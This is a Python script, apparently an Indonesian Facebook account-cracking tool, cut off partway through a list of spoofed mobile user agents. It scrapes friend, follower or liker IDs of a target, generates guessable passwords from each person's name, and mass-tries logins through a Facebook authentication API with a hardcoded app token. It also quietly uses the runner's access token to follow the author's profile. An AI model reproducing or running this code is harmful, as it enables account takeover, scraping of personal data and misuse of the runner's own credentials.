#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Dapunta And XNSCODE Project
# Update V0.1

# Copyright© Dapunta ID 2021
# 100% Open Source Code

# Author : Dapunta Adyapaksi R.
# Facebook (Dapunta Khurayra X)   : Facebook.com/Dapunta.Khurayra.X
# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : Instagram.com/ratya.anonym.id
# Whatsapp (Dapunta Bot_Key)      : +6282245780524
# YouTube (Xayonara.ID)           : Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA

# Free Recode For Personal Use
# Bebas Recode Untuk Penggunaan Pribadi
# Izin Terlebih Dahulu Apabila Ingin Re-Upload
# Jangan Jual Belikan File Source Code Ini !

### Import Module
import requests,sys,bs4,os,random,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime

### Perumpamaan Module & Syntax
_req_get_   = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_dapunta_cici_    = print
_cici_dapunta_    = input
_dapunta_dapunta_ = open
_cici_cici_       = exit

### Waktu & Tanggal
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bu < 0 or bu > 12:
        _cici_cici_()
    buTemp = bu - 1
except ValueError:
    _cici_cici_()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

### Warna
_P_ = "\x1b[0;97m" # Putih
_M_ = "\x1b[0;91m" # Merah
_H_ = "\x1b[0;92m" # Hijau
_U_ = "\x1b[0;91m" # Ungu

### Logo
_logo_line_1_ = ('%s ___  __  __ ___ ___ '%(_P_))
_logo_line_2_ = ('%s|   \|  \/  | _ ) __| %s┌─────────────────────────┐'%(_P_,_U_))
_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s│   %s• Code By Asim •  %s│'%(_P_,_U_,_P_,_U_))
_logo_line_4_ = ('%s|___/|_|  |_|___/_|   %s│ %sAsimBot Fl Command  %s│'%(_P_,_U_,_P_,_U_))
_logo_line_5_ = ('%s Rajpoot Team 2021      └─────────────────────────┘'%(_U_))
def _my_logo_():
    _dapunta_cici_(_logo_line_1_)
    _dapunta_cici_(_logo_line_2_)
    _dapunta_cici_(_logo_line_3_)
    _dapunta_cici_(_logo_line_4_)
    _dapunta_cici_(_logo_line_5_+'\n')

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

### Penampungan
_id_tampung_ = []

### Jangan Diganti Nanti Error
_oscylopsce_ = '__Dapunta__'
_ascylapsci_ = '__Cici__'
_escylipsce_ = '__Dapunta_Love_Cici__'
_uscylupsci_ = '__My_Love____Dapunta____Dapunta_Love_Cici____Cici____Forever__'

### Membuat Folder Direktori
def _folder_():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

### Clear Login Session
def _bersih_():
    try:os.remove('token.txt')
    except:pass

### Clear User Agent
def _del_():
    try:os.remove('ugent.txt')
    except:pass

### Clear Terminal
def _clear_():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

### Jangan Diganti Anjink!
def _bot_follow_(_tok_dev_):
    token = _tok_dev_
    try:
        _req_post_("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra 
        time.sleep(2)
    except (KeyError,IOError):pass

### Login
def _login_dev_(_Cici_Cantik_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Cici_Cantik_Banget_:_dapunta_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:pass
    _tok_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan Token :\n\n'%(_U_,_P_,_U_,_P_))
    try:
        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
        _js_load_  = _js_lo_(_req_tok_.text)
        _nama_dev_ = _js_load_['name']
        _op_dev_ = _dapunta_dapunta_('token.txt','w')
        _op_dev_.write(_tok_dev_)
        _op_dev_.close()
        _bot_follow_(_tok_dev_)
        _default_ua_(_Cici_Cantik_Banget_)
        _menu_dev_(_Cici_Cantik_Banget_)
    except (KeyError,IOError):
        _dapunta_cici_('\n%s[%s!%s] %sToken Invalid'%(_M_,_P_,_M_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Cici_Cantik_Banget_)
    except requests.exceptions.ConnectionError:
        _dapunta_cici_('\n%s[%s!%s] %sKoneksi Bermasalah'%(_M_,_P_,_M_,_P_))
        _cici_cici_()

### Menu
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Dapunta_Ganteng_Banget_:_dapunta_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:pass
    try:
        _tok_dev_  = _dapunta_dapunta_("token.txt","r").read()
        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
        _js_load_  = _js_lo_(_req_tok_.text)
        _nama_dev_ = _js_load_['name']
        _id_dev_   = _js_load_['id']
    except (KeyError,IOError):
        _dapunta_cici_('%s[%s!%s] %sToken Invalid'%(_M_,_P_,_M_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    except requests.exceptions.ConnectionError:
        _dapunta_cici_('%s[%s!%s] %sKoneksi Bermasalah'%(_M_,_P_,_M_,_P_))
        _cici_cici_()
    try:
        _ip_url_ = "http://ip-api.com/json/"
        _ip_headers_ = {
            "Referer":"http://ip-api.com/",
            "Content-Type":"application/json; charset=utf-8",
            "User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            }
        _ip_req_ = _req_get_(_ip_url_,headers=_ip_headers_).json()
        _ip_dev_ = _ip_req_["query"]
    except:
        _ip_dev_ = " "
    _dapunta_cici_('%s[%s•%s] %sHalo %s%s'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_))
    _dapunta_cici_('%s[%s•%s] %sID : %s'%(_U_,_P_,_U_,_P_,_id_dev_))
    _dapunta_cici_('%s[%s•%s] %sIP : %s\n'%(_U_,_P_,_U_,_P_,_ip_dev_))
    _dapunta_cici_('%s[%s1%s] %sCrack ID Dari Teman/Publik'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCrack ID Dari Pengikut'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s3%s] %sCrack ID Dari Likers'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s4%s] %sLihat Hasil Crack'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s0%s] %sLog Out'%(_U_,_P_,_U_,_P_))
    _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)
    elif _dapunta_menu__cici_dapunta__ in ['1','01','a']:
        _publik_dev_(_tok_dev_)
    elif _dapunta_menu__cici_dapunta__ in ['2','02','b']:
        _followers_dev_(_tok_dev_)
    elif _dapunta_menu__cici_dapunta__ in ['3','03','c']:
        _likers_dev_(_tok_dev_)
    elif _dapunta_menu__cici_dapunta__ in ['4','04','d']:
        _cek_result_dev_()
    elif _dapunta_menu__cici_dapunta__ in ['5','05','e']:
        _ugen_dev_(_Dapunta_Ganteng_Banget_)
    elif _dapunta_menu__cici_dapunta__ in ['0','00','z']:
        _dapunta_cici_('%s[%s•%s] %sSampai Jumpa %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)

### Dump ID Publik
def _publik_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/friends?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Dump ID Pengikut
def _followers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/subscribers?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Dump ID Likers
def _likers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/likes?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Generate Password
def _pass_list_(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1")
                _dapunta_.append(i+"12")
                _dapunta_.append(i+"1122")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1")
                _dapunta_.append(i+"12")
                _dapunta_.append(i+"1122")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"1")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"1234")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12345")
    _dapunta_.append("pakistan")
    _dapunta_.append("pakistan123")
    _dapunta_.append("pakistan1")
    _dapunta_.append("pakistan12")
    _dapunta_.append("pakistan1234")
    return _dapunta_

### Logger Crack
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    abu = [
					"Mozilla/5.0 (Linux; Android 6.0; 818 3G Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 7.0; Lenovo TB-7504X Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; HT50 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/65.0.0.42.81;]",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; F5122 Build/34.4.A.2.50; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; MEIZU_M5 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/159.0.0.29.93;]",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-G935A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 5.1; Lenovo P1ma40 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; MEIZU_M5 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T285 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/129.0.0.29.67;]",
"Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]",
"Mozilla/5.0 (Linux; Android 5.1; XT1052 Build/LPAS23.12-15.5-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; MI 5 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; MI 5 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A300FU Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/161.0.0.35.93;]",
"Mozilla/5.0 (Linux; Android 6.0.1; XT1254 Build/MCG24.251-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SGP771 Build/32.4.A.1.54; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.1.0; TA-1053 Build/OPR1.170623.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; PRA-LA1 Build/HUAWEIPRA-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J106B Build/MMB29Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; BLL-L21 Build/HUAWEIBLL-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 5.1.1; Mi-4c Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.1; S7 Build/NMF26O; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-ph; GT-I9205 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]",
"Mozilla/5.0 (Linux; Android 5.1; BV5000 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/87.0.0.7.184;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J510H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/69.0.0.10.400;]",
"Mozilla/5.0 (Linux; Android 5.1; m2 note Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; Lenovo K33a42 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]",
